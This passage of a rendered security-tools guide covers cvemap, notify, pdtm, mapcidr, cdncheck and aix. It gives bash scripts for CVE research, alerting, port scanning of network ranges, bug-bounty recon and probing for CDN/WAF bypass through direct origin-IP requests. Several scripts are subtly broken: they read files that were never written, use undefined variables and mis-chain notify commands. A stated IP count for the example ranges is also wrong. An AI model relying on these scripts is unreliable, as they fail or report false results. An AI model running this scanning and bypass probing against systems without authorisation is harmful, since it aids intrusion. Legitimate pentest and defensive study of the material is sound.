filtering\ncvemap -age 7  # Last 7 days\n\n# Combined filters\ncvemap -vendor apache -severity high -age 30\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-14",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Threat Intelligence and Vulnerability Management"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Enterprise security team\n# Objective: Daily threat intelligence gathering\n\n#!/bin/bash\n# Script: daily_cve_intelligence.sh\n\nDATE=$(date +%Y%m%d)\nREPORT_FILE="cve_intelligence_$DATE.txt"\n\necho "=== Daily CVE Intelligence Report - $DATE ===" > $REPORT_FILE\necho "" >> $REPORT_FILE\n\n# High-priority vendors for the organization\nVENDORS=("microsoft" "apache" "nginx" "openssh" "linux")\n\nfor vendor in "${VENDORS[@]}"; do\n    echo "=== $vendor CVEs (Last 7 days) ===" >> $REPORT_FILE\n    cvemap -vendor "$vendor" -age 7 -severity high,critical -json | \\\n    jq -r \'.[] | [.cve_id, .cvss_score, .epss_score, .cve_description] | @csv\' >> $REPORT_FILE\n    echo "" >> $REPORT_FILE\ndone\n\n# Trending vulnerabilities with high EPSS scores\necho "=== High EPSS Score CVEs (Active Exploitation Likely) ===" >> $REPORT_FILE\ncvemap -epss-score ">0.7" -age 30 -json | \\\njq -r \'.[] | [.cve_id, .epss_score, .cvss_score, .cve_description] | @csv\' >> $REPORT_FILE\n\n# Send report to security team\nmail -s "Daily CVE Intelligence Report" security-team@company.com < $REPORT_FILE\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Asset-Specific Vulnerability Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Infrastructure inventory\n# Objective: Match CVEs to specific assets\n\n# Extract technology stack from asset inventory\ncat asset_inventory.csv | cut -d\',\' -f3 | sort -u > tech_stack.txt\n\n# Check CVEs for each technology\nwhile read technology; do\n    echo "=== CVEs for $technology ==="\n    \n    # Extract vendor and product\n    vendor=$(echo $technology | cut -d\' \' -f1)\n    product=$(echo $technology | cut -d\' \' -f2-)\n    \n    # Search for relevant CVEs\n    cvemap -vendor "$vendor" -product "$product" -age 365 -severity medium,high,critical -json | \\\n    jq -r \'.[] | [.cve_id, .cvss_score, .cve_description] | @csv\' > "${technology}_cves.csv"\n    \n    # Count critical issues\n    critical_count=$(jq -r \'.[] | select(.cvss_score >= 9.0) | .cve_id\' "${technology}_cves.json" 2>/dev/null | wc -l)\n    echo "Critical CVEs found: $critical_count"\n    \ndone < tech_stack.txt\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Penetration Testing CVE Research"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Penetration testing engagement\n# Objective: Identify exploitable vulnerabilities for discovered services\n\n# Service discovery results from reconnaissance\ncat discovered_services.txt | while read service; do\n    # Parse service information\n    host=$(echo $service | cut -d',' -f1)\n    port=$(echo $service | cut -d',' -f2)\n    service_name=$(echo $service | cut -d',' -f3)\n    version=$(echo $service | cut -d',' -f4)\n    \n    echo \"Researching CVEs for $service_name $version on $host:$port\"\n    \n    # Search for CVEs with PoC availability\n    cvemap -product \"$service_name\" -json | \\\n    jq -r --arg version \"$version\" '.[] | select(.affected_versions | contains($version)) | \n           select(.has_poc == true or .exploitdb_id != null) | \n           [.cve_id, .cvss_score, .exploitdb_id, .cve_description] | @csv' > \"${host}_${port}_exploitable_cves.csv\"\n    \n    # Prioritize by exploitability\n    sort -t',' -k2 -nr \"${host}_${port}_exploitable_cves.csv\" | head -5\ndone\n\n# Generate penetration testing target list\nfind . -name \"*_exploitable_cves.csv\" -exec cat {} \\; | \\\nsort -t',' -k2 -nr | head -20 > priority_targets.csv\n"})}),"\n",(0,i.jsx)(n.h4,{id:"integration-with-security-tools",children:"Integration with Security Tools"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"CVEMap + Nuclei Integration"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Research CVEs for a specific product\ncvemap -product "wordpress" -severity high -json > wordpress_cves.json\n\n# Extract CVE IDs\njq -r \'.[] | .cve_id\' wordpress_cves.json > wordpress_cve_ids.txt\n\n# Scan with Nuclei using CVE-specific templates\ncat wordpress_cve_ids.txt | while read cve; do\n    nuclei -u https://target-wordpress.com -t "cves/$cve" 2>/dev/null\ndone\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Automated Vulnerability Correlation"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n# Script: correlate_vulnerabilities.sh\n\nTARGET_DOMAIN=$1\n\n# Technology detection\nhttpx -u "https://$TARGET_DOMAIN" -tech-detect -json > tech_detection.json\n\n# Extract technologies\njq -r \'.tech[]?\' tech_detection.json | while read tech; do\n    vendor=$(echo $tech | cut -d\'/\' -f1)\n    product=$(echo $tech | cut -d\'/\' -f2)\n    \n    # Research recent high-impact CVEs\n    cvemap -vendor "$vendor" -product "$product" -age 90 -severity high,critical -json > "${tech}_cves.json"\n    \n    # Check if Nuclei templates exist\n    template_count=$(find $HOME/nuclei-templates -name "*${cve}*" 2>/dev/null | wc -l)\n    \n    if [ $template_count -gt 0 ]; then\n        echo "$tech has $template_count Nuclei templates available"\n        # Add to priority scan list\n        echo "$tech" >> priority_scan_targets.txt\n    fi\ndone\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"16-notify---multi-platform-notification-tool",children:"16. Notify - Multi-Platform Notification Tool"}),"\n",(0,i.jsx)(n.h4,{id:"overview-15",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Notify streams output from security tools to multiple platforms including Slack, Discord, Telegram, and custom webhooks."}),"\n",(0,i.jsx)(n.h4,{id:"installation-15",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/notify/cmd/notify@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"configuration-3",children:"Configuration"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yaml",children:'# ~/.config/notify/provider-config.yaml\nslack:\n  - webhook_url: "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"\n    username: "SecurityBot"\n    channel: "#security-alerts"\n\ndiscord:\n  - webhook_url: "https://discord.com/api/webhooks/YOUR/WEBHOOK"\n    username: "SecurityBot"\n\ntelegram:\n  - bot_token: "YOUR_BOT_TOKEN"\n    chat_id: "YOUR_CHAT_ID"\n\nemail:\n  - smtp_server: "smtp.gmail.com"\n    smtp_port: 587\n    username: "alerts@company.com"\n    password: "app_password"\n    to: ["security-team@company.com"]\n\ncustom:\n  - webhook_url: "https://api.company.com/security-alerts"\n    headers:\n      Authorization: "Bearer YOUR_TOKEN"\n'})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-15",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Send to Slack\necho "Security alert: High severity vulnerability found" | notify -provider slack\n\n# Send to multiple providers\necho "Critical finding detected" | notify -provider slack,discord,email\n\n# Pipe from other tools\nnuclei -u https://target.com -severity critical | notify -provider slack\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-15",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Real-Time Security Monitoring"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Production infrastructure\n# Objective: Immediate alerting for critical findings\n\n#!/bin/bash\n# Script: realtime_security_monitor.sh\n\nTARGETS_FILE="production_assets.txt"\nSLACK_CHANNEL="#security-incidents"\n\n# Continuous monitoring loop\nwhile true; do\n    TIMESTAMP=$(date \'+%Y-%m-%d %H:%M:%S\')\n    \n    # High-severity vulnerability scanning\n    nuclei -list $TARGETS_FILE -severity critical -json | \\\n    while read -r result; do\n        CVE=$(echo "$result" | jq -r \'.["template-id"]\')\n        HOST=$(echo "$result" | jq -r \'.host\')\n        SEVERITY=$(echo "$result" | jq -r \'.info.severity\')\n        NAME=$(echo "$result" | jq -r \'.info.name\')\n        \n        # Format alert message\n        ALERT="\ud83d\udea8 *CRITICAL VULNERABILITY DETECTED* \ud83d\udea8\n*Time:* $TIMESTAMP\n*Target:* $HOST\n*Vulnerability:* $NAME\n*Template:* $CVE\n*Severity:* $SEVERITY\n*Action Required:* Immediate investigation and remediation"\n        \n        # Send to multiple channels\n        echo "$ALERT" | notify -provider slack -slack-channel "$SLACK_CHANNEL"\n        echo "$ALERT" | notify -provider discord\n        echo "$ALERT" | notify -provider email\n        \n        # Log to file\n        echo "$TIMESTAMP,$HOST,$CVE,$SEVERITY,$NAME" >> critical_vulnerabilities.log\n    done\n    \n    # Check for new exposed services\n    naabu -list $TARGETS_FILE -top-ports 100 -json | \\\n    jq -r \'select(.port != null) | [.host, .port] | @csv\' | \\\n    while IFS=, read host port; do\n        # Check if this is a new service\n        if ! grep -q "$host:$port" known_services.txt; then\n            echo "$host:$port" >> known_services.txt\n            \n            ALERT="\ud83d\udd0d *NEW SERVICE DETECTED* \ud83d\udd0d\n*Host:* $host\n*Port:* $port\n*Time:* $TIMESTAMP\n*Action:* Security assessment required"\n            \n            echo "$ALERT" | notify -provider slack -slack-channel "#infrastructure-changes"\n        fi\n    done\n    \n    sleep 300  # Wait 5 minutes\ndone\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Penetration Testing Workflow Integration"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Penetration testing engagement\n# Objective: Streamlined reporting and team coordination\n\n#!/bin/bash\n# Script: pentest_workflow.sh\n\nTARGET_DOMAIN=$1\nENGAGEMENT_ID=$2\nTEAM_CHANNEL="#pentest-${ENGAGEMENT_ID}"\n\n# Initialize engagement\nINIT_MESSAGE="\ud83c\udfaf *PENETRATION TEST INITIATED* \ud83c\udfaf\n*Target:* $TARGET_DOMAIN\n*Engagement ID:* $ENGAGEMENT_ID\n*Start Time:* $(date)\n*Team:* Penetration Testing Team"\n\necho "$INIT_MESSAGE" | notify -provider slack -slack-channel "$TEAM_CHANNEL"\n\n# Phase 1: Reconnaissance\necho "\ud83d\udce1 Starting reconnaissance phase..." | notify -provider slack -slack-channel "$TEAM_CHANNEL"\n\nsubfinder -d "$TARGET_DOMAIN" -silent | \\\ntee subdomains.txt | \\\nwc -l | \\\nxargs -I {} echo "Found {} subdomains for $TARGET_DOMAIN" | \\\nnotify -provider slack -slack-channel "$TEAM_CHANNEL"\n\n# Phase 2: Service discovery\necho "\ud83d\udd0d Starting service discovery..." | notify -provider slack -slack-channel "$TEAM_CHANNEL"\n\ncat subdomains.txt | \\\nhttpx -silent | \\\ntee live_hosts.txt | \\\nwc -l | \\\nxargs -I {} echo "Identified {} live web services" | \\\nnotify -provider slack -slack-channel "$TEAM_CHANNEL"\n\n# Phase 3: Vulnerability scanning\necho "\ud83d\udee1\ufe0f Starting vulnerability assessment..." | notify -provider slack -slack-channel "$TEAM_CHANNEL"\n\nnuclei -list live_hosts.txt -severity medium,high,critical -json | \\\nwhile read -r vuln; do\n    TEMPLATE=$(echo "$vuln" | jq -r \'.["template-id"]\')\n    HOST=$(echo "$vuln" | jq -r \'.host\')\n    SEVERITY=$(echo "$vuln" | jq -r \'.info.severity\')\n    NAME=$(echo "$vuln" | jq -r \'.info.name\')\n    \n    VULN_ALERT="\ud83d\udd13 *VULNERABILITY FOUND*\n*Host:* $HOST\n*Issue:* $NAME\n*Severity:* $SEVERITY\n*Template:* $TEMPLATE"\n    \n    echo "$VULN_ALERT" | notify -provider slack -slack-channel "$TEAM_CHANNEL"\ndone\n\n# Generate summary report\nTOTAL_HOSTS=$(cat live_hosts.txt | wc -l)\nCRITICAL_VULNS=$(grep \'"severity":"critical"\' nuclei_results.json | wc -l)\nHIGH_VULNS=$(grep \'"severity":"high"\' nuclei_results.json | wc -l)\n\nSUMMARY="\ud83d\udcca *PENETRATION TEST SUMMARY*\n*Target:* $TARGET_DOMAIN\n*Total Hosts:* $TOTAL_HOSTS\n*Critical Vulnerabilities:* $CRITICAL_VULNS\n*High Vulnerabilities:* $HIGH_VULNS\n*Completion Time:* $(date)"\n\necho "$SUMMARY" | notify -provider slack,email -slack-channel "$TEAM_CHANNEL"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Bug Bounty Automation"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Bug bounty program\n# Objective: Automated discovery and alerting\n\n#!/bin/bash\n# Script: bug_bounty_automation.sh\n\nPROGRAM_NAME=$1\nSCOPE_FILE="$PROGRAM_NAME.scope"\nDISCORD_WEBHOOK="https://discord.com/api/webhooks/YOUR/WEBHOOK"\n\n# Monitor for new assets\nwhile true; do\n    # Asset discovery\n    cat "$SCOPE_FILE" | while read domain; do\n        subfinder -d "$domain" -silent | \\\n        comm -13 "known_assets_$domain.txt" - > "new_assets_$domain.txt"\n        \n        if [ -s "new_assets_$domain.txt" ]; then\n            NEW_COUNT=$(cat "new_assets_$domain.txt" | wc -l)\n            \n            DISCOVERY_ALERT="\ud83c\udd95 *NEW ASSETS DISCOVERED* \ud83c\udd95\n*Program:* $PROGRAM_NAME\n*Domain:* $domain\n*New Assets:* $NEW_COUNT\n*Assets:*\n\\`\\`\\`\n$(cat "new_assets_$domain.txt")\n\\`\\`\\`"\n            \n            echo "$DISCOVERY_ALERT" | notify -provider discord\n            \n            # Quick vulnerability scan on new assets\n            cat "new_assets_$domain.txt" | \\\n            httpx -silent | \\\n            nuclei -t exposures/ -severity medium,high,critical | \\\n            notify -provider discord -discord-username "BugBountyBot"\n            \n            # Update known assets\n            cat "new_assets_$domain.txt" >> "known_assets_$domain.txt"\n            sort -u "known_assets_$domain.txt" -o "known_assets_$domain.txt"\n        fi\n    done\n    \n    sleep 3600  # Check every hour\ndone\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-integration-patterns",children:"Advanced Integration Patterns"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Custom Webhook Integration"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Custom API integration for ticketing systems\nnuclei -u https://target.com -severity high,critical -json | \\\njq -r \'[.host, .["template-id"], .info.severity, .info.name] | @csv\' | \\\nwhile IFS=, read host template severity name; do\n    # Create JIRA ticket\n    curl -X POST "https://company.atlassian.net/rest/api/2/issue" \\\n         -H "Content-Type: application/json" \\\n         -u "user@company.com:api_token" \\\n         -d "{\n           \\"fields\\": {\n             \\"project\\": {\\"key\\": \\"SEC\\"},\n             \\"summary\\": \\"$severity: $name\\",\n             \\"description\\": \\"Host: $host\\\\nTemplate: $template\\",\n             \\"issuetype\\": {\\"name\\": \\"Bug\\"}\n           }\n         }"\ndone\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Multi-Stage Notification Workflows"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Escalation workflow based on severity\necho "Critical vulnerability found" | \\\nnotify -provider slack -slack-channel "#security-team" && \\\nnotify -provider email -email-to "security-manager@company.com" && \\\nnotify -provider custom -webhook-url "https://api.pagerduty.com/incidents"\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"utility-tools",children:"Utility Tools"}),"\n",(0,i.jsx)(n.h3,{id:"17-pdtm---projectdiscovery-tool-manager",children:"17. PDTM - ProjectDiscovery Tool Manager"}),"\n",(0,i.jsx)(n.h4,{id:"overview-16",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"PDTM (ProjectDiscovery Tool Manager) simplifies the installation and management of all ProjectDiscovery tools."}),"\n",(0,i.jsx)(n.h4,{id:"installation-16",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/pdtm/cmd/pdtm@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-16",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# List available tools\npdtm list\n\n# Install all tools\npdtm install-all\n\n# Install specific tool\npdtm install nuclei\n\n# Update all tools\npdtm update-all\n\n# Remove tool\npdtm remove httpx\n"})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-16",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Security Team Workstation Setup"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n# Script: security_workstation_setup.sh\n\necho "Setting up ProjectDiscovery security toolkit..."\n\n# Install PDTM\ngo install -v github.com/projectdiscovery/pdtm/cmd/pdtm@latest\n\n# Install all ProjectDiscovery tools\npdtm install-all\n\n# Verify installations\npdtm list | grep -E "(nuclei|subfinder|httpx|naabu|katana)"\n\n# Update Nuclei templates\nnuclei -update-templates\n\n# Create directory structure\nmkdir -p ~/security/{wordlists,results,scripts,reports}\n\n# Download common wordlists\ncd ~/security/wordlists\nwget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-110000.txt\nwget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-medium.txt\n\necho "Security workstation setup complete!"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Automated Tool Management"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n# Script: daily_tool_maintenance.sh\n\nLOG_FILE="/var/log/pdtm_maintenance.log"\nDATE=$(date \'+%Y-%m-%d %H:%M:%S\')\n\necho "[$DATE] Starting daily tool maintenance" >> $LOG_FILE\n\n# Check for updates\npdtm list | while read tool status; do\n    if [[ $status == *"outdated"* ]]; then\n        echo "[$DATE] Updating $tool" >> $LOG_FILE\n        pdtm update "$tool" 2>> $LOG_FILE\n    fi\ndone\n\n# Update Nuclei templates\nnuclei -update-templates -silent 2>> $LOG_FILE\n\n# Verify tools are working\nTOOLS=("nuclei" "subfinder" "httpx" "naabu" "katana")\nfor tool in "${TOOLS[@]}"; do\n    if command -v "$tool" &> /dev/null; then\n        echo "[$DATE] $tool: OK" >> $LOG_FILE\n    else\n        echo "[$DATE] $tool: MISSING - Reinstalling" >> $LOG_FILE\n        pdtm install "$tool" 2>> $LOG_FILE\n    fi\ndone\n\necho "[$DATE] Tool maintenance completed" >> $LOG_FILE\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"18-mapcidr---cidr-manipulation-utility",children:"18. MapCIDR - CIDR Manipulation Utility"}),"\n",(0,i.jsx)(n.h4,{id:"overview-17",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"MapCIDR performs various operations on CIDR ranges including expansion, aggregation, and manipulation."}),"\n",(0,i.jsx)(n.h4,{id:"installation-17",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-17",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Expand CIDR to IPs\necho "192.168.1.0/24" | mapcidr\n\n# Count IPs in CIDR\necho "10.0.0.0/8" | mapcidr -count\n\n# Aggregate CIDRs\ncat cidrs.txt | mapcidr -aggregate\n\n# Slice CIDR\necho "192.168.0.0/16" | mapcidr -slice-size 256\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-17",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Network Security Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Corporate network ranges\n# Objective: Systematic security assessment\n\n# Define corporate IP ranges\ncat > corporate_ranges.txt << EOF\n10.0.0.0/8\n172.16.0.0/12\n192.168.0.0/16\n203.0.113.0/24\nEOF\n\n# Count total IPs\ncat corporate_ranges.txt | mapcidr -count\n# Output: Total IPs: 16,909,056\n\n# Break into manageable chunks for scanning\ncat corporate_ranges.txt | mapcidr -slice-size 1024 > scanning_chunks.txt\n\n# Scan each chunk\ncat scanning_chunks.txt | while read cidr; do\n    echo "Scanning $cidr"\n    naabu -cidr "$cidr" -top-ports 100 -o "scan_$(echo $cidr | tr \'/\' \'_\').txt"\ndone\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Cloud Infrastructure Mapping"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Multi-cloud deployment\n# Objective: Map and monitor cloud IP ranges\n\n# AWS IP ranges\ncurl -s https://ip-ranges.amazonaws.com/ip-ranges.json | \\\njq -r \'.prefixes[] | select(.service=="EC2") | .ip_prefix\' | \\\nhead -100 > aws_ranges.txt\n\n# Process AWS ranges\ncat aws_ranges.txt | mapcidr -aggregate > aws_aggregated.txt\n\n# Identify overlapping ranges\nmapcidr -cl aws_ranges.txt,azure_ranges.txt -overlap\n\n# Monitor for changes\ndiff aws_ranges_previous.txt aws_ranges.txt | \\\ngrep ">" | cut -c 3- | \\\nmapcidr -count\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Penetration Testing Scope Management"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Penetration testing engagement\n# Objective: Manage testing scope and exclusions\n\n# Define testing scope\ncat > in_scope.txt << EOF\n192.168.1.0/24\n10.0.1.0/24\n172.16.1.0/24\nEOF\n\n# Define exclusions\ncat > exclusions.txt << EOF\n192.168.1.1\n192.168.1.254\n10.0.1.1\n172.16.1.1\nEOF\n\n# Calculate actual testing targets\ncat in_scope.txt | mapcidr > all_targets.txt\ncomm -23 all_targets.txt exclusions.txt > testing_targets.txt\n\n# Verify scope size\necho "Total targets for testing: $(cat testing_targets.txt | wc -l)"\n\n# Generate testing batches\nsplit -l 100 testing_targets.txt batch_\nfor batch in batch_*; do\n    mv "$batch" "${batch}.txt"\ndone\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"19-cdncheck---cdn-and-technology-detection",children:"19. CDNCheck - CDN and Technology Detection"}),"\n",(0,i.jsx)(n.h4,{id:"overview-18",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"CDNCheck detects CDN providers and various technologies for given DNS names or IP addresses."}),"\n",(0,i.jsx)(n.h4,{id:"installation-18",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-18",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Check CDN for domain\necho "example.com" | cdncheck\n\n# Check multiple domains\ncat domains.txt | cdncheck\n\n# JSON output\necho "example.com" | cdncheck -json\n\n# Check specific IP\necho "1.2.3.4" | cdncheck\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-18",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Web Application Security Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: E-commerce platform\n# Objective: Understand infrastructure and bypass restrictions\n\n# Identify CDN usage\ncat ecommerce_domains.txt | cdncheck -json > cdn_analysis.json\n\n# Extract direct IP addresses\njq -r '.[] | select(.cdn == false) | .input' cdn_analysis.json > direct_ips.txt\n\n# Identify CDN providers\njq -r '.[] | select(.cdn == true) | [.input, .provider] | @csv' cdn_analysis.json > cdn_providers.csv\n\n# Find potential CDN bypass opportunities\ncat direct_ips.txt | httpx -silent -title > direct_access_check.txt\n\n# Test for origin server exposure\ncat cdn_providers.csv | while IFS=, read domain provider; do\n    # Common origin server patterns\n    for subdomain in origin direct admin; do\n        echo \"$subdomain.$domain\" | cdncheck\n    done\ndone\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Infrastructure Intelligence Gathering"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Competitor analysis\n# Objective: Understand technology stack and hosting choices\n\n# Analyze competitor domains\ncat competitor_domains.txt | cdncheck -json > competitor_cdn.json\n\n# CDN distribution analysis\njq -r \'.[] | select(.cdn == true) | .provider\' competitor_cdn.json | \\\nsort | uniq -c | sort -nr > cdn_market_share.txt\n\n# Identify self-hosted vs CDN usage\nTOTAL_DOMAINS=$(cat competitor_domains.txt | wc -l)\nCDN_DOMAINS=$(jq -r \'.[] | select(.cdn == true) | .input\' competitor_cdn.json | wc -l)\nSELF_HOSTED=$((TOTAL_DOMAINS - CDN_DOMAINS))\n\necho "CDN Usage Analysis:"\necho "Total domains: $TOTAL_DOMAINS"\necho "Using CDN: $CDN_DOMAINS ($(( CDN_DOMAINS * 100 / TOTAL_DOMAINS ))%)"\necho "Self-hosted: $SELF_HOSTED ($(( SELF_HOSTED * 100 / TOTAL_DOMAINS ))%)"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: DDoS Protection Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Critical business applications\n# Objective: Assess DDoS protection capabilities\n\n# Check protection services\ncat critical_apps.txt | cdncheck -json | \\\njq -r \'.[] | [.input, .cdn, .provider, .waf] | @csv\' > protection_analysis.csv\n\n# Identify unprotected assets\ngrep "false" protection_analysis.csv | cut -d\',\' -f1 > unprotected_assets.txt\n\n# Verify WAF bypass possibilities\ncat unprotected_assets.txt | while read domain; do\n    # Test for direct access\n    nslookup "$domain" | grep "Address:" | tail -n +2 | cut -d\' \' -f2 | \\\n    while read ip; do\n        curl -H "Host: $domain" "http://$ip" -I 2>/dev/null | head -1\n    done\ndone\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"20-aix---ai-powered-security-assistant",children:"20. AIx - AI-Powered Security Assistant"}),"\n",(0,i.jsx)(n.h4,{id:"overview-19",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"AIx integrates Large Language Models (LLMs) for security analysis, vulnerability assessment, and automated reporting."}),"\n",(0,i.jsx)(n.h4,{id:"installation-19",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/aix/cmd/aix@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"configuration-4",children:"Configuration"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Configure OpenAI API key\nexport OPENAI_API_KEY="your_api_key_here"\n\n# Configure other providers\naix config set provider anthropic\naix config set api_key "your_anthropic_key"\n'})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-19",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Analyze vulnerability scan results\nnuclei -u https://target.com -json | aix analyze\n\n# Generate security report\ncat scan_results.json | aix report\n\n# Ask security questions\necho "What are the risks of exposed .git directories?" | aix query\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-19",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Automated Vulnerability Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Web application security assessment\n# Objective: Intelligent vulnerability analysis and prioritization\n\n# Run comprehensive scan\nnuclei -u https://webapp.com -severity medium,high,critical -json > webapp_vulns.json\n\n# AI-powered analysis\ncat webapp_vulns.json | aix analyze --prompt "\nAnalyze these vulnerability scan results and provide:\n1. Risk prioritization based on exploitability\n2. Business impact assessment\n3. Remediation recommendations\n4. Detection evasion indicators\nFormat the response as a structured security report."\n\n# Generate executive summary\ncat webapp_vulns.json | aix summarize --audience executive --format markdown > executive_summary.md\n\n# Technical remediation guide\ncat webapp_vulns.json | aix remediate --format technical > remediation_guide.txt\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Threat Intelligence Integration"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Suspicious network activity\n# Objective: Contextual threat analysis\n\n# Gather IOCs from security tools\ncat suspicious_ips.txt | while read ip; do\n    echo "IP: $ip"\n    whois 